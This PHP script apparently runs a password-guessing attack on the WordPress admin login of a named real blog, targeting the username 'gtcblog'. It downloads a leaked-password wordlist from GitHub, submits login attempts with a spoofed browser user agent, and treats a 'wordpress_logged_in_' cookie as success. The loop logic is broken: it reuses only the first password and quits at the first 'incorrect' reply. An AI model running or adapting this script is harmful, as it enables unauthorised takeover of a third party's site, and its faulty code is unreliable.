<?php
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);
ini_set('memory_limit', '2512M');

$url = "https://blog.getcontact.com/wp-login.php";
$username = "gtcblog";
/*
https://raw.githubusercontent.com/josuamarcelc/common-password-list/refs/heads/main/rockyou_2025_00.txt
https://raw.githubusercontent.com/josuamarcelc/common-password-list/refs/heads/main/rockyou_2025_01.txt
https://raw.githubusercontent.com/josuamarcelc/common-password-list/refs/heads/main/rockyou_2025_02.txt
https://raw.githubusercontent.com/josuamarcelc/common-password-list/refs/heads/main/rockyou_2025_03.txt
https://raw.githubusercontent.com/josuamarcelc/common-password-list/refs/heads/main/rockyou_2025_04.txt
https://raw.githubusercontent.com/josuamarcelc/common-password-list/refs/heads/main/rockyou_2025_05.txt
*/

$cookieFile = __DIR__ . '/cookie.txt';

function loginWithRetry($url, $username, $password = '', $cookieFile) {
  
    $response = file_get_contents('https://raw.githubusercontent.com/josuamarcelc/common-password-list/refs/heads/main/rockyou_2025_00.txt');
    $lines = array_filter(array_map('trim', explode("\n", $response)));
    $password = $lines[0] ?? null;
    $maxAttempts = count($lines)-1;

    for ($i = 1; $i <= $maxAttempts; $i++) {

        $ch = curl_init();

        curl_setopt_array($ch, [
            CURLOPT_URL => $url,
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => http_build_query([
                'log' => $username,
                'pwd' => $password,
                'wp-submit' => 'Log In',
                'redirect_to' => 'https://blog.getcontact.com/wp-admin/',
                'testcookie' => '1'
            ]),
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_HEADER => true,
            CURLOPT_FOLLOWLOCATION => false,
            CURLOPT_COOKIEJAR => $cookieFile,
            CURLOPT_COOKIEFILE => $cookieFile,
            CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120 Safari/537.36'
        ]);

        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);

        curl_close($ch);

        // Read cookies
        $cookies = file_exists($cookieFile) ? file_get_contents($cookieFile) : '';

        // ✅ SUCCESS CONDITION (most reliable)
        if (strpos($cookies, 'wordpress_logged_in_') !== false) {
            echo "✅ Login success on attempt {$i}\n";
            return true;
        }

        // ❌ HARD FAIL (wrong credentials)
        if (strpos($response, 'incorrect') !== false || strpos($response, 'Invalid') !== false) {
            echo "❌ Invalid credentials\n";
            return false;
        }

        // 🔁 Retry condition
        echo "⚠️ Attempt {$i} failed (HTTP {$httpCode}), retrying...\n";
        sleep(1); // small delay
    }

    echo "❌ Failed after {$maxAttempts} attempts\n";
    return false;
}

// Run
loginWithRetry($url, $username, $password, $cookieFile);
